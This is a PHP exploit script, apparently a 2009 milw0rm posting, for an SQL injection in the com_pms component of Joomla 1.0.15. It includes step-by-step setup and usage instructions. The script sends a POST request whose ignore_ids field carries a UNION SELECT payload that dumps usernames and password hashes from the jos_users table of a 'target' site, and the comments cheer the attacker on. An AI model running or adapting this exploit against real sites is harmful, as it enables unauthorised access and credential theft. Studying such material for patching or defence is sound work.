<?php

/*
--------------------------

Joomla <=1.0.15 Component com_pms <=2.0.4  (Ignore-List) SQl-Injection Vuln

--------------------------

Author: M4dhead

Vulnerable joomla component : com_pms

Conditions        : magic_quotes_gpc = On or Off it doesn't matter ;)

--------------------------

PREPARATION:
--------------------------
You need a valid Account on the Joomla 1.0.15 Site + Community Builder Suite 1.1.0:


Community Builder Suite 1.1.0:
http://www.joomlaos.de/option,com_remository/Itemid,41/func,finishdown/id,1175.html

PMS enhanced Version 2.0.4 J 1.0
http://www.make-website.de/script-downlaods?task=summary&cid=123&catid=214


Install Joomla 1.0.15
Install Community Builder
Install PMS Enhanced
    Activate the Ignorlist in Components->PMS Enhanced->Config
    Tab: Backend -> Ingorlist: Yes


Create a valid User on the target Joomla 1.0.15 System with Community Builder,
login and copy the cookieinformation into the $cookie var below,
adjust the User-Agent on your Post Header dependent on your Browser.


Notice: Pay attention on your User-Agent in the POST Header, it have to be the same as you have logged in,
because the cookie-name is dependent on your browser.
--------------------------

USAGE:
--------------------------
Run this script! If there's not shown a page that prompt you to login, the attack was successful.
Then go to the ignore list: www.yourtargetsite.com/index.php?option=com_pms&Itemid=&page=ignore
and you will see some username and passwords in the selectbox :-)

Have fun!!

----------------------------------------------------
*/


$host = "localhost"; //your target Joomla Site
$cookie = "290cd01070fed63ac53f84f5c91d2bd9=a5846a8c64962e14367d5c7298f6c72c"; //replace this with your own cookie values
$useragent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13\r\n";

//NOTICE: Pay attention on your User-Agent in the POST Header, it have to be the same as you have logged in,
//because the cookie-name is dependent on your browser.

//Don't change anything below
$path = "/joomla/index.php?option=com_pms&Itemid=&page=ignore"; //dont change this
$data_to_send = "no_entry=keine+Eintr%E4ge&save=Ignorliste+speichern&filter_site_users=alle&ignore_ids=|63, 111 ) AND 1=2 UNION SELECT 1,concat(username,char(0x3a), password),3 from jos_users -- /* |"; //you don't have to change this


print_r($post = PostToHost($host, $path, $cookie, $data_to_send, $useragent));



function PostToHost($host, $path, $cookie, $data_to_send, $useragent) {
  $fp = fsockopen($host, 80);
  fputs($fp, "POST $path HTTP/1.1\r\n");
  fputs($fp, "Host: $host\r\n");
  fputs($fp, "User-Agent: $useragent");
  fputs($fp, "Cookie: $cookie\r\n");
  fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
  fputs($fp, "Content-length: ". strlen($data_to_send) ."\r\n");
  fputs($fp, "Connection: close\r\n\r\n");
  fputs($fp, $data_to_send);
  while(!feof($fp)) {
      $res .= fgets($fp, 128);
  }
  fclose($fp);

  return $res;
}

?>

# milw0rm.com [2009-08-07]
